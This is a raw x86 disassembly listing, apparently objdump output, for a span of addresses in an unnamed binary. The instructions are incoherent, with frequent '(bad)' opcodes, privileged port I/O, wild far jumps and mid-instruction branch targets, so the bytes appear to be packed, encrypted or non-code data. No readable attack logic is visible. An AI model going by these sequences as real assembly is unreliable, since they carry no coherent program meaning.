  4220b5:	mov    ch,0x48
  4220b7:	sbb    BYTE PTR [ebx+0x2a06b17c],dh
  4220bd:	(bad)
  4220c0:	push   edx
  4220c1:	test   DWORD PTR [eax+0x5c],esp
  4220c4:	push   ds
  4220c5:	push   cs
  4220c6:	push   0xc35c38fd
  4220cb:	in     al,0x37
  4220cd:	arpl   bx,si
  4220cf:	ret    0x43a5
  4220d2:	lods   eax,DWORD PTR ds:[esi]
  4220d3:	cmc    
  4220d4:	ret    
  4220d5:	(bad)  
  4220d6:	jge    0x42206a
  4220d8:	cs ins DWORD PTR es:[edi],dx
  4220da:	mov    eax,0xb84cf237
  4220df:	add    DWORD PTR [ebx+0x10],edx
  4220e2:	(bad)  
  4220e3:	retf   0xb10c
  4220e6:	nop
  4220e7:	in     al,0x56
  4220e9:	xor    al,0xd0
  4220eb:	cmp    ebp,DWORD PTR [ecx+0x7c166f8c]
  4220f1:	jle    0x422142
  4220f3:	in     eax,0x7a
  4220f5:	fnstcw WORD PTR [edi-0x3a6b4ad7]
  4220fb:	push   edi
  4220fc:	pop    edi
  4220fd:	mov    ds:0x12f7c213,al
  422102:	out    0xbd,eax
  422104:	mov    cl,0xff
  422106:	cmp    al,0x95
  422108:	call   FWORD PTR [eax+0x4c350714]
  42210e:	inc    edi
  42210f:	fistp  DWORD PTR [edi+0x1b617805]
  422115:	ja     0x42209d
  422117:	jg     0x42215e
  422119:	bound  esp,QWORD PTR [eax+eiz*4-0x72db20cb]
  422120:	push   ebp
  422121:	lea    ecx,[edx-0x53d6a058]
  422127:	mov    bh,0x44
  422129:	xchg   esp,eax
  42212a:	push   esp
  42212b:	xchg   edi,eax
  42212c:	outs   dx,BYTE PTR ds:[esi]
  42212d:	adc    eax,0xe95f05e5
  422132:	sub    al,0x2a
  422134:	in     al,dx
  422135:	nop
  422136:	das    
  422137:	push   es
  422138:	push   esi
  422139:	retf   0xbbc6
  42213c:	inc    ebx
  42213d:	les    esi,FWORD PTR ds:0xc510509a
  422143:	and    al,BYTE PTR [eax]
  422145:	(bad)  
  422146:	addr16 push 0xffffffb3
  422149:	sbb    BYTE PTR [edi+0x6c083830],dl
  42214f:	push   cs
  422150:	jno    0x422139
  422152:	cli    
  422153:	adc    bh,BYTE PTR [eax-0x1dc23eb5]
  422159:	and    ah,BYTE PTR [edx+0x62c8021]
  42215f:	and    ebx,DWORD PTR [esi+edx*1+0x7d]
  422163:	stos   BYTE PTR es:[edi],al
  422164:	lds    ebx,FWORD PTR [eax]
  422166:	push   DWORD PTR [eax-0x72d904f]
  42216c:	pop    ebp
  42216d:	mov    bh,0x5
  42216f:	xchg   edi,eax
  422170:	cmp    DWORD PTR [edi-0x3f],esp
  422173:	loopne 0x42214f
  422175:	int3   
  422176:	shl    DWORD PTR [eax],cl
  422178:	mov    ebp,0xbcfcd7de
  42217d:	cdq    
  42217e:	enter  0xdfa8,0x1c
  422182:	or     edi,DWORD PTR [eax+0x296d1a94]
  422188:	dec    esi
  422189:	mov    cl,BYTE PTR [esi+ecx*8]
  42218c:	jno    0x422126
  42218e:	and    eax,0xc8804a21
  422193:	xor    ebp,edi
  422195:	es mov bh,0x4d
  422198:	jb     0x4221e5
  42219a:	push   esp
  42219b:	adc    eax,0xe47f12d0
  4221a0:	test   BYTE PTR [eax],ah
  4221a2:	in     eax,0x8b
  4221a4:	cdq    
  4221a5:	fisub  WORD PTR [ebp+0x183e6ca8]
  4221ab:	aam    0x4e
  4221ad:	jne    0x4221c5
  4221af:	jb     0x422162
  4221b1:	bound  esi,QWORD PTR [esi-0x480f39e5]
  4221b7:	and    eax,0x92add11d
  4221bc:	lock (bad) 
  4221be:	mov    cl,0x95
  4221c0:	lock loope 0x422213
  4221c3:	(bad)  
  4221c4:	xchg   ebp,eax
  4221c5:	push   esi
  4221c6:	fld    TBYTE PTR [ebp-0x14debd67]
  4221cc:	and    esp,esi
  4221ce:	int    0x4a
  4221d0:	mov    BYTE PTR [ebx+0x467dbcb0],al
  4221d6:	fist   WORD PTR [eax-0x5b]
  4221d9:	pop    esi
  4221da:	test   DWORD PTR [bx+di-0x7dec],edi
  4221df:	cmp    edi,esi
  4221e1:	push   es
  4221e2:	sbb    al,0xfc
  4221e4:	shl    esi,cl
  4221e6:	mov    ds:0x6cda6e75,eax
  4221eb:	(bad)  
  4221ec:	ins    BYTE PTR es:[edi],dx
  4221ed:	jb     0x422174
  4221ef:	fst    st(7)
  4221f1:	lds    edx,FWORD PTR [edx]
  4221f3:	frstor [ecx-0x5a]
  4221f6:	outs   dx,DWORD PTR ds:[esi]
  4221f7:	in     al,0x2e
  4221f9:	dec    esp
  4221fa:	or     al,0x2a
  4221fc:	or     DWORD PTR [edx],ecx
  4221fe:	push   ss
  4221ff:	cmp    eax,0x91f0ce83
  422204:	cmp    bl,BYTE PTR [ebx]
  422206:	test   eax,0x750d97db
  42220b:	out    0x7c,eax
  42220d:	pop    ebp
  42220e:	outs   dx,BYTE PTR ds:[esi]
  42220f:	sub    al,BYTE PTR [edi-0xd1ec529]
  422215:	mov    edi,ebp
  422217:	idiv   ebp
  422219:	addr16 in eax,dx
  42221b:	or     eax,0x22272fbe
  422220:	cmp    al,0x26
  422222:	xlat   BYTE PTR fs:[ebx]
  422224:	sbb    al,0x41
  422226:	jecxz  0x4221cf
  422228:	mov    dl,BYTE PTR [edx+0x28]
  42222b:	mov    ebp,0xcccc76c2
  422230:	lds    eax,FWORD PTR [edi-0x79]
  422233:	pop    ds
  422234:	mov    WORD PTR [eax+0x79d6f3df],es
  42223a:	pushf  
  42223b:	pop    esp
  42223c:	mov    edx,0x5efbce21
  422241:	xchg   edx,eax
  422242:	add    al,0x91
  422244:	cmp    edx,DWORD PTR [edx]
  422246:	test   al,0x97
  422248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422249:	out    0x16,al
  42224b:	bound  edx,QWORD PTR [ebp-0x26794225]
  422251:	dec    eax
  422252:	int3   
  422253:	test   al,0x42
  422255:	inc    edi
  422256:	cmp    eax,DWORD PTR [edi]
  422258:	mov    al,0x2f
  42225a:	mov    edi,0x142f30e1
  42225f:	jae    0x42227b
  422261:	addr16 call 0xf81b824c
  422267:	aad    0x66
  422269:	jmp    0x422290
  42226b:	(bad)  
  42226d:	cs mov eax,0x585a516b
  422273:	shl    ecx,1
  422275:	daa    
  422276:	jbe    0x4222eb
  422278:	idiv   BYTE PTR [esi+edx*2+0x2f710b11]
  42227f:	arpl   WORD PTR [edi],cx
  422281:	sbb    BYTE PTR [edi+0x376e19c7],0x5d
  422288:	daa    
  422289:	push   edi
  42228a:	mov    ecx,fs
  42228c:	inc    edx
  42228d:	cmp    esi,esp
  42228f:	xchg   edi,eax
  422290:	jnp    0x422259
  422292:	stos   DWORD PTR es:[edi],eax
  422293:	ds mov ecx,0xbfa52ea9
  422299:	pop    edx
  42229a:	and    eax,DWORD PTR [edx]
  42229c:	sar    DWORD PTR [ecx-0x2022b407],0x14
  4222a3:	mov    dl,0x49
  4222a5:	add    ch,BYTE PTR ds:0x231464c3
  4222ab:	or     DWORD PTR [esi+0x73],0xa
  4222af:	or     dh,cl
  4222b1:	test   DWORD PTR [esp+edi*4-0x7ac49a40],ecx
  4222b8:	ins    DWORD PTR es:[edi],dx
  4222b9:	loopne 0x4222bf
  4222bb:	adc    eax,0xb3c2a416
  4222c0:	aad    0xe4
  4222c2:	mov    bh,0x35
  4222c4:	mov    ds:0x30a2b3bc,al
  4222c9:	mov    ds:0x6f63fc9a,al
  4222ce:	test   eax,0x3f5eae72
  4222d3:	pop    ebp
  4222d4:	mov    al,ds:0x99beb58a
  4222d9:	sbb    eax,0x99e80549
  4222de:	adc    BYTE PTR [esi-0x7da7ef75],bh
  4222e4:	or     ecx,DWORD PTR [ebx]
  4222e6:	out    0x7c,al
  4222e8:	inc    ecx
  4222e9:	imul   esp,DWORD PTR [eax-0x72],0x51
  4222ed:	push   edi
  4222ee:	push   edi
  4222ef:	dec    edi
  4222f0:	xchg   ecx,eax
  4222f1:	in     eax,dx
  4222f2:	ja     0x4222ba
  4222f4:	enter  0xc952,0x98
  4222f8:	push   ds
  4222f9:	hlt    
  4222fa:	outs   dx,DWORD PTR ds:[esi]
  4222fb:	cmp    al,0xdc
  4222fd:	cmp    DWORD PTR [eax-0x4b13be2b],ebx
  422303:	mov    ds:0x16e04792,eax
  422308:	icebp  
  422309:	popa   
  42230a:	fidiv  DWORD PTR [esi+esi*1+0x9]
  42230e:	mov    ecx,0xca619f21
  422313:	push   ebp
  422314:	call   0xb155958d
  422319:	lock js 0x42235e
  42231c:	push   eax
  42231d:	pop    esi
  42231e:	jne    0x42235c
  422320:	jecxz  0x422308
  422322:	mov    DWORD PTR [ecx-0x6d],ebx
  422325:	add    eax,0x2221e37b
  42232a:	ds pop eax
  42232c:	jmp    0xf36bb4d
  422331:	movups XMMWORD PTR [ecx],xmm2
  422334:	fist   DWORD PTR [edi+0x2d]
  422337:	or     al,0xd9
  422339:	sub    eax,0xda29cbcc
  42233e:	clc    
  42233f:	cmp    BYTE PTR [eax+0x29],dl
  422342:	sub    eax,0xae8e4d07
  422347:	push   edi
  422348:	rcr    bh,cl
  42234a:	sub    BYTE PTR [ebx],ah
  42234c:	add    DWORD PTR [edx+0x66100597],ebp
  422352:	jne    0x4222f3
  422354:	mov    cl,BYTE PTR [ecx+0x26]
  422357:	dec    esp
  422358:	call   0x73ab:0x23d909df
  42235f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422360:	xlat   BYTE PTR ds:[ebx]
  422361:	imul   eax,DWORD PTR [esi],0xde8a331
  422367:	sub    ecx,DWORD PTR [ecx-0x6c4a7306]
  42236d:	or     cl,bh
  42236f:	add    edx,DWORD PTR [esi]
  422371:	mov    edx,DWORD PTR [ebx-0x46]
  422374:	int    0x50
  422376:	mul    esp
  422378:	pop    ss
  422379:	push   esi
  42237a:	and    edx,DWORD PTR [edx-0x9]
  42237d:	imul   ecx,DWORD PTR [edi-0x2469a534],0x8464f9d6
  422387:	out    dx,al
  422388:	xlat   BYTE PTR ds:[ebx]
  422389:	sub    esp,DWORD PTR [ecx+0x5]
  42238c:	retf   0xf542
  42238f:	enter  0xadb5,0x26
  422393:	fnstsw WORD PTR [ebx]
  422395:	sahf   
  422396:	repz cmp ebp,DWORD PTR [esi-0x33867ff]
  42239d:	out    0x75,eax
  42239f:	adc    ebx,DWORD PTR [eax]
  4223a1:	jae    0x42234e
  4223a3:	test   BYTE PTR [eax-0x4ae37d5],0x1a
  4223aa:	mov    bh,0xe9
  4223ac:	lock aaa 
  4223ae:	out    dx,eax
  4223af:	jl     0x4223c4
  4223b1:	sub    esp,eax
  4223b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223b4:	xchg   ebx,eax
  4223b5:	es stc 
  4223b7:	xchg   ebp,eax
  4223b8:	dec    ebx
  4223b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223ba:	and    esi,DWORD PTR [ecx]
  4223bc:	and    BYTE PTR [ebx],0xe5
  4223bf:	dec    ebp
  4223c0:	std    
  4223c1:	sub    esi,0x72e4231c
  4223c7:	inc    ebx
  4223c8:	and    bl,BYTE PTR [ebx-0x6b]
  4223cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223cc:	xchg   ebp,eax
  4223cd:	sbb    al,0x13
  4223cf:	test   BYTE PTR [edi],ah
  4223d1:	jb     0x42242f
  4223d3:	ror    ch,0x20
  4223d6:	mov    ah,0x7b
  4223d8:	(bad)  
  4223d9:	out    dx,al
  4223da:	sub    al,0xef
  4223dc:	and    eax,0xb2006377
  4223e1:	xor    eax,0x6c730d76
  4223e6:	imul   DWORD PTR ds:0x247d94e2
  4223ec:	sub    dh,BYTE PTR [eax]
  4223ee:	mov    BYTE PTR [ecx+0x7c5de7a0],cl
  4223f4:	mov    esp,0xfcad94fc
  4223f9:	sub    DWORD PTR ds:0x9f30efe0,ecx
  4223ff:	sti    
  422400:	push   esp
  422401:	out    dx,al
  422402:	ins    DWORD PTR es:[edi],dx
  422403:	cs sti 
  422405:	cmc    
  422406:	xchg   edx,eax
  422407:	mov    esi,0x8dc9517b
  42240c:	dec    esi
  42240d:	add    al,0x82
  42240f:	bound  ecx,QWORD PTR [ebx]
  422411:	out    dx,eax
  422412:	push   es
  422413:	jns    0x42239a
  422415:	dec    esi
  422416:	push   esp
  422417:	test   cl,dl
  422419:	mov    eax,ds:0xbc655ed
  42241e:	in     eax,dx
  42241f:	push   esi
  422420:	push   cs
  422421:	or     bl,0x3c
  422424:	jno    0x42242a
  422426:	mov    ecx,0x312f8a32
  42242b:	int3   
  42242c:	mov    ch,0x4e
  42242e:	out    0x7c,al
  422430:	(bad)
  422433:	stc    
  422434:	pop    es
  422435:	push   ecx
  422436:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422437:	sbb    ch,dh
  422439:	xchg   edi,eax
  42243a:	inc    esi
  42243b:	je     0x4224b6
  42243d:	jmp    0x422474
  42243f:	shl    BYTE PTR [esi+0x79c375d3],1
  422445:	fsubr  DWORD PTR [esi]
  422447:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422448:	jbe    0x42245f
  42244a:	mov    edx,0x73eafd0a
  42244f:	dec    eax
  422450:	jnp    0x422421
  422452:	cmp    DWORD PTR [eax-0x42],esp
  422455:	mov    DWORD PTR [edx+0x2],ebp
  422458:	stos   BYTE PTR es:[edi],al
  422459:	clc    
  42245a:	test   eax,0xb9120078
  42245f:	stc    
  422460:	pop    ebx
  422461:	pop    edx
  422462:	test   eax,0x85344ea7
  422467:	inc    ecx
  422468:	adc    DWORD PTR [ecx-0x364f3e2e],0xffffffbf
  42246f:	loopne 0x4224c2
  422471:	xchg   ebx,eax
  422472:	enter  0x4aa2,0x86
  422476:	shl    bl,cl
  422478:	mov    ebx,0x2c44f391
  42247d:	jbe    0x42244a
  42247f:	inc    edx
  422480:	lods   eax,DWORD PTR ds:[esi]
  422481:	dec    esp
  422482:	fsub   QWORD PTR [edi+0x72]
  422485:	and    al,0x72
  422487:	mov    dh,0x15
  422489:	and    edx,ecx
  42248b:	das    
  42248c:	pop    es
  42248d:	xchg   edi,eax
  42248e:	and    bh,BYTE PTR [edi]
  422490:	in     eax,0x5
  422492:	push   DWORD PTR [ebx-0x7019e85f]
  422498:	jl     0x42250b
  42249a:	sahf   
  42249b:	or     BYTE PTR [ecx],0xfd
  42249e:	nop
  42249f:	pop    esi
  4224a0:	imul   edi,DWORD PTR [edi],0xffffff9e
  4224a3:	neg    BYTE PTR [ecx]
  4224a5:	cmp    al,0xab
  4224a7:	int    0xd8
  4224a9:	pop    ecx
  4224aa:	jp     0x422524
  4224ac:	push   ds
  4224ad:	and    DWORD PTR ds:0x75e2e34e,ebp
  4224b3:	adc    eax,0xe29b4d77
  4224b8:	jle    0x42252a
  4224ba:	fbstp  TBYTE PTR [ebx]
  4224bc:	jmp    0x5b24:0xa91d2079
  4224c3:	push   esi
  4224c4:	in     al,0xde
  4224c6:	mov    esi,0xbab13804
  4224cb:	loop   0x4224c2
  4224cd:	adc    dl,bl
  4224cf:	ja     0x422461
  4224d1:	mov    ebx,0xd286c599
  4224d6:	sub    ebx,ebp
  4224d8:	or     eax,DWORD PTR [esi-0x78ffcd17]
  4224de:	in     al,dx
  4224df:	stc    
  4224e0:	cs iret 
  4224e2:	out    0xd5,al
  4224e4:	xor    BYTE PTR [edi],cl
  4224e6:	mov    edi,?
  4224e8:	lods   al,BYTE PTR ds:[esi]
  4224e9:	fistp  WORD PTR [esi+0x1a]
  4224ec:	add    ebp,ebx
  4224ee:	and    al,0x60
  4224f0:	xor    ecx,ecx
  4224f2:	cli    
  4224f3:	ins    DWORD PTR es:[edi],dx
  4224f4:	push   esp
  4224f5:	adc    eax,0x1a0c5d1d
  4224fa:	pop    ds
  4224fb:	test   BYTE PTR [eax],bl
  4224fd:	outs   dx,BYTE PTR ds:[esi]
  4224fe:	xchg   esi,eax
  4224ff:	adc    edi,edx
  422501:	and    DWORD PTR [eax+0x10686591],0x1b82a508
  42250b:	inc    edi
  42250c:	xor    eax,0x6f4301a8
  422511:	rep lods al,BYTE PTR ds:[esi]
  422513:	mov    WORD PTR [eax],ss
  422515:	ja     0x422509
  422517:	(bad)  
  422518:	test   DWORD PTR [esi+0x75],0xdc044e6f
  42251f:	int3   
  422520:	retf   
  422521:	ja     0x42253c
  422523:	scas   al,BYTE PTR es:[edi]
  422524:	mov    ah,0x33
  422526:	out    dx,al
  422527:	dec    ebp
  422528:	lea    edx,[ecx+0x56]
  42252b:	loop   0x4225a6
  42252d:	sub    al,0x77
  42252f:	call   0x5a6af86c
  422534:	xchg   edi,eax
  422535:	popa   
  422536:	dec    ebp
  422537:	mov    esp,gs
  422539:	mov    al,ds:0x34a300de
  42253e:	jno    0x4225a4
  422540:	sbb    al,0x8e
  422542:	fimul  WORD PTR cs:[esi+ecx*8+0x15db8fb9]
  42254a:	scas   eax,DWORD PTR es:[edi]
  42254b:	addr16 or eax,0xf25c0ad
  422551:	cmp    eax,0xcd16b62c
  422556:	pop    ds
  422557:	mov    edi,0x8eeed1e9
  42255c:	fldcw  WORD PTR [edx-0x680cce04]
  422562:	pop    ecx
  422563:	mov    dl,0x1b
  422565:	test   eax,0x43010519
  42256a:	push   edi
  42256b:	xor    eax,DWORD PTR [edi-0x3913a88]
  422571:	adc    al,dl
  422573:	pop    ss
  422574:	cmp    DWORD PTR ds:0xf1156fa5,ecx
  42257a:	(bad)  
  42257b:	dec    DWORD PTR [ebx]
  42257d:	aam    0x81
  42257f:	repz mov al,0xa8
  422582:	fisubr WORD PTR [edi-0x76]
  422585:	adc    dh,BYTE PTR [edi+0x590eafc8]
  42258b:	(bad)  
  42258c:	loop   0x4225a3
  42258e:	test   eax,0x39a169ed
  422593:	mov    al,ds:0xde
	...
  4225a8:	add    BYTE PTR [eax],al
  4225aa:	inc    edx
  4225ab:	inc    esp
  4225ac:	inc    ebx
  4225ad:	push   edi
  4225ae:	inc    edi
  4225af:	push   edi
  4225b0:	push   esi
  4225b1:	push   ebp
  4225b2:	outs   dx,DWORD PTR ds:[esi]
  4225b3:	pop    ebp
  4225b4:	mov    ds:0xc94912dc,eax
  4225b9:	aas    
  4225ba:	call   0xd3422772
  4225bf:	push   es
  4225c0:	add    BYTE PTR [eax],al
  4225c2:	adc    BYTE PTR [eax+edi*8-0xe],bh
  4225c6:	push   cs
  4225c7:	and    al,ah
  4225c9:	int3   
  4225ca:	sub    al,0xb5
  4225cc:	in     al,0x86
  4225ce:	sub    esp,DWORD PTR [edi+eax*8-0x61366a76]
  4225d5:	test   eax,0x82d3f3aa
  4225da:	xchg   edx,eax
  4225db:	ds dec esp
  4225dd:	in     al,dx
  4225de:	(bad)  
  4225df:	out    dx,eax
  4225e0:	cdq    
  4225e1:	icebp  
  4225e2:	inc    esp
  4225e3:	sbb    BYTE PTR [eax],0xb6
  4225e6:	imul   DWORD PTR [ebx-0x5f]
  4225e9:	inc    ebp
  4225ea:	mov    esi,0x10124de8
  4225ef:	sbb    edi,DWORD PTR [ebp+0x5fcf7022]
  4225f5:	in     eax,0x76
  4225f7:	push   ds
  4225f8:	in     al,0xb5
  4225fa:	xor    DWORD PTR [edx],0xffffffb7
  4225fd:	xchg   ebp,eax
  4225fe:	imul   esp,DWORD PTR [eax],0xffffff83
  422601:	lahf   
  422602:	dec    ebp
  422603:	add    DWORD PTR [esi-0x58a0a07a],ebx
  422609:	or     al,bh
  42260b:	js     0x4225e7
  42260d:	xchg   ebp,eax
  42260e:	dec    esi
  42260f:	test   eax,0x2a0e7e6
  422614:	xchg   edi,eax
  422615:	push   eax
  422616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422617:	hlt    
  422618:	psubusb mm3,QWORD PTR [esi-0x79]
  42261c:	les    edi,FWORD PTR [ecx]
  42261e:	stos   DWORD PTR es:[edi],eax
  42261f:	pop    ebp
  422620:	push   ebx
  422621:	bound  ecx,QWORD PTR [ebp+0x18]
  422624:	stos   DWORD PTR es:[edi],eax
  422625:	dec    ecx
  422626:	sbb    DWORD PTR [edi],ebx
  422628:	adc    bl,BYTE PTR [edi+0x49]
  42262b:	aaa    
  42262c:	outs   dx,BYTE PTR ds:[esi]
  42262d:	push   ecx
  42262e:	gs das 
  422630:	jecxz  0x4225bd
  422632:	cmc    
  422633:	out    0xff,al
  422635:	(bad)  
  422636:	neg    BYTE PTR [edi-0x1865323e]
  42263c:	jbe    0x42260a
  42263e:	xchg   BYTE PTR [esi],ah
  422640:	aam    0x65
  422642:	test   al,0xaa
  422644:	enter  0x73bc,0x63
  422648:	test   BYTE PTR [esi-0x30ab319c],al
  42264e:	iret   
  42264f:	pop    eax
  422650:	or     edi,DWORD PTR [edx+0x19]
  422653:	adc    eax,0xd0898585
  422658:	pop    ss
  422659:	mov    eax,ds:0x776bc6f2
  42265e:	cli    
  42265f:	scas   al,BYTE PTR es:[edi]
  422660:	(bad)  
  422662:	inc    esp
  422663:	push   es
  422664:	clc    
  422665:	inc    edx
  422666:	call   0x1c9a37e3
  42266b:	retf   0x2734
  42266e:	dec    ecx
  42266f:	xor    al,0x44
  422671:	push   eax
  422672:	dec    ebx
  422673:	push   esi
  422674:	jmp    0xf7f79426
  422679:	cmp    BYTE PTR [ecx-0x482d053a],bl
  42267f:	daa    
  422680:	xor    ch,ah
  422682:	pmulhw mm3,mm7
  422685:	aad    0xed
  422687:	daa    
  422688:	cmp    eax,0x267d6c2a
  42268d:	pop    edx
  42268e:	test   BYTE PTR [edx],ah
  422690:	aas    
  422691:	aad    0x20
  422693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422694:	pop    ds
  422695:	js     0x422620
  422697:	sbb    DWORD PTR [edi],0x60
  42269a:	cmp    ebp,DWORD PTR [ecx]
  42269c:	sub    BYTE PTR ds:0x2d471b66,ah
  4226a2:	iret   
  4226a3:	jbe    0x422647
  4226a5:	pop    ss
  4226a6:	and    DWORD PTR [ebx],0xffffff88
  4226a9:	sar    BYTE PTR [ecx-0x6b],1
  4226ac:	bound  esi,QWORD PTR ds:0xeac5e06d
  4226b2:	sbb    DWORD PTR [ebx-0x5],edi
  4226b5:	dec    esi
  4226b6:	jmp    0x1e08:0x5c5180bf
  4226bd:	lods   al,BYTE PTR ds:[esi]
  4226be:	mov    ecx,0xa5294944
  4226c3:	lods   eax,DWORD PTR ds:[esi]
  4226c4:	fnsave [edx]
  4226c6:	mov    cl,0x71
  4226c8:	push   0xfffffffa
  4226ca:	lods   al,BYTE PTR ds:[esi]
  4226cb:	push   es
  4226cc:	xchg   edx,eax
  4226cd:	xchg   esp,eax
  4226ce:	push   ebx
  4226cf:	xlat   BYTE PTR ds:[ebx]
  4226d0:	push   esi
  4226d1:	dec    ebp
  4226d2:	cli    
  4226d3:	outs   dx,DWORD PTR ds:[esi]
  4226d4:	shl    DWORD PTR [edi-0x26],cl
  4226d7:	call   0x789:0x60e01de
  4226de:	adc    al,0xe7
  4226e0:	and    bh,BYTE PTR ds:0xa62655a9
  4226e6:	add    dl,BYTE PTR [ebx+edi*2+0xe27d67c]
  4226ed:	scas   eax,DWORD PTR es:[edi]
  4226ee:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4226f0:	jb     0x4226bb
  4226f2:	ins    DWORD PTR es:[edi],dx
  4226f3:	mov    eax,0xd7f2e32
  4226f8:	mov    ds:0x81a23d05,al
  4226fd:	mov    al,ds:0xe5da0050
  422702:	xor    al,0x3
  422704:	sub    al,0x1a
  422706:	push   esi
  422707:	jmp    0x7f30:0x56d67f56
  42270e:	retf   
  42270f:	hlt    
  422710:	rol    BYTE PTR [ebp-0x482dac43],1
  422716:	pushf  
  422717:	adc    ch,ch
  422719:	aas    
  42271a:	(bad)  
  42271b:	sub    ebp,DWORD PTR [ebx]
  42271d:	cdq    
  42271e:	imul   ebx,esp,0xd0d575d8
  422724:	push   edi
  422725:	and    eax,0x7de34d59
  42272a:	pop    edx
  42272b:	sbb    BYTE PTR [edx-0x6e],ch
  42272e:	inc    ecx
  42272f:	sub    eax,0x9876e726
  422734:	mov    ah,0x8d
  422736:	inc    ebp
  422737:	adc    cl,BYTE PTR [eax]
  422739:	pop    esp
  42273a:	xor    eax,0x11a60185
  42273f:	sti    
  422740:	bswap  eax
  422742:	xor    esi,DWORD PTR [edi]
  422744:	or     DWORD PTR [ebx],esp
  422746:	jo     0x42270f
  422748:	call   0xb5af:0x406dd4c2
  42274f:	call   0xd355:0x4ea62cb5
  422756:	mov    ebx,DWORD PTR [ecx+ebp*4+0x31]
  42275a:	lods   al,BYTE PTR ds:[esi]
  42275b:	jne    0x4226f7
  42275d:	mov    bh,0xa5
  42275f:	push   es
  422760:	scas   al,BYTE PTR es:[edi]
  422761:	lahf   
  422762:	call   0xeedb:0x84e6d77f
  422769:	ins    DWORD PTR es:[edi],dx
  42276a:	xchg   BYTE PTR [eax],ch
  42276c:	cwde   
  42276d:	cmp    esi,edi
  42276f:	mov    al,0x2c
  422771:	add    DWORD PTR ds:0xf2dd0132,esp
  422777:	test   eax,0xb1452404
  42277c:	verr   di
  42277f:	jge    0x42273b
  422781:	mov    dh,0xde
  422783:	and    al,0xd2
  422785:	sar    BYTE PTR [ecx+0x3c],cl
  422788:	stos   DWORD PTR es:[edi],eax
  422789:	loopne 0x42271d
  42278b:	xchg   BYTE PTR [edx],bh
  42278d:	ss das 
  42278f:	(bad)  
  422790:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422791:	sbb    bh,BYTE PTR [ecx-0x683da6bc]
  422797:	cld    
  422798:	retf   0x209f
  42279b:	outs   dx,DWORD PTR ds:[esi]
  42279c:	aam    0x49
  42279e:	scas   eax,DWORD PTR es:[edi]
  42279f:	sbb    DWORD PTR [ebx-0x4151f286],esi
  4227a5:	(bad)  
  4227a7:	sbb    ecx,edi
  4227a9:	loope  0x4227be
  4227ab:	pop    ebp
  4227ac:	mov    ds:0x2aa1dc5a,eax
  4227b1:	mov    cl,0xda
  4227b3:	push   0xffffffdc
  4227b5:	sbb    bh,BYTE PTR [ecx]
  4227b7:	addr16 loopne 0x422744
  4227ba:	ret    
  4227bb:	jns    0x4227ca
  4227bd:	fild   DWORD PTR [esi]
  4227bf:	xchg   ebx,eax
  4227c0:	fdivr  st,st(4)
  4227c2:	push   0x56
  4227c4:	ret    0x7338
  4227c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227c8:	repnz dec esp
  4227ca:	gs xchg edx,eax
  4227cc:	outs   dx,DWORD PTR ds:[esi]
  4227cd:	inc    ebx
  4227ce:	push   edi
  4227cf:	xchg   ecx,eax
  4227d0:	xchg   BYTE PTR [ebx-0x65],cl
  4227d3:	fmul   QWORD PTR [esi+0x49]
  4227d6:	popf   
  4227d7:	jae    0x422794
  4227d9:	push   esp
  4227da:	outs   dx,BYTE PTR ds:[esi]
  4227db:	shr    DWORD PTR [esi+0x64],1
  4227de:	mov    eax,0x70901b28
  4227e3:	sbb    ah,BYTE PTR cs:[ecx-0x7e]
  4227e7:	aam    0x41
  4227e9:	pop    ss
  4227ea:	and    dh,BYTE PTR [ecx+0xb7aed22]
  4227f0:	sub    DWORD PTR [eax+ebx*4+0x7d],ebx
  4227f4:	lahf   
  4227f5:	lods   al,BYTE PTR ds:[esi]
  4227f6:	mov    esp,DWORD PTR [ecx+0x21]
  4227f9:	out    dx,ax
  4227fb:	push   ss
  4227fc:	xchg   ch,dl
  4227fe:	pop    eax
  4227ff:	pushf  
  422800:	fs sbb al,0x88
  422803:	lock xchg esp,eax
  422805:	mov    ch,0xb4
  422807:	adc    cl,BYTE PTR [edi]
  422809:	loop   0x422843
  42280b:	sub    ebp,DWORD PTR [ebx+ecx*2-0x30]
  42280f:	ret    
  422810:	inc    ebx
  422811:	mov    dh,0x1e
  422813:	hlt    
  422814:	ret    
  422815:	retf   0xb533
  422818:	mov    al,ds:0xa0abecbc
  42281d:	jo     0x422804
  42281f:	xor    al,0xfb
  422822:	push   edi
  422823:	push   ebx
  422824:	and    BYTE PTR [eax],dl
  422826:	clc    
  422827:	iret   
  422828:	pop    ss
  422829:	mov    ah,BYTE PTR [ebx]
  42282b:	ss (bad) 
  42282d:	mov    ch,bh
  42282f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422830:	push   ds
  422831:	push   edx
  422832:	lahf   
  422833:	push   edi
  422834:	loop   0x422877
  422836:	daa    
  422837:	adc    ebp,0x2a6607da
  42283d:	popf   
  42283e:	ror    edx,1
  422840:	fwait
  422841:	cmp    eax,0x1b8ab0f7
  422846:	ror    DWORD PTR [ebx+0x1df7251a],0x2a
  42284d:	inc    ebx
  42284e:	push   edx
  42284f:	sub    al,0x46
  422851:	xchg   edi,eax
  422852:	pop    esi
  422853:	enter  0xc99e,0xf8
  422857:	(bad)  
  422858:	push   0x67
  42285a:	and    esp,DWORD PTR [esi]
  42285c:	stos   BYTE PTR es:[edi],al
  42285d:	push   ss
  42285e:	ror    DWORD PTR [edi],cl
  422860:	inc    ebx
  422861:	mov    ebp,0xafdc6fbc
  422866:	push   ds
  422867:	popa   
  422868:	xor    BYTE PTR ds:0x7d3950cb,0x78
  42286f:	ds stos DWORD PTR es:[edi],eax
  422871:	stc    
  422872:	test   BYTE PTR [eax+0x442ff581],cl
  422878:	ins    DWORD PTR es:[edi],dx
  422879:	ret    0x844a
  42287c:	xchg   DWORD PTR [edx+0x68],edx
  42287f:	xchg   ebp,eax
  422880:	push   ebx
  422881:	out    dx,al
  422882:	lods   eax,DWORD PTR ds:[esi]
  422883:	cmp    al,0xd2
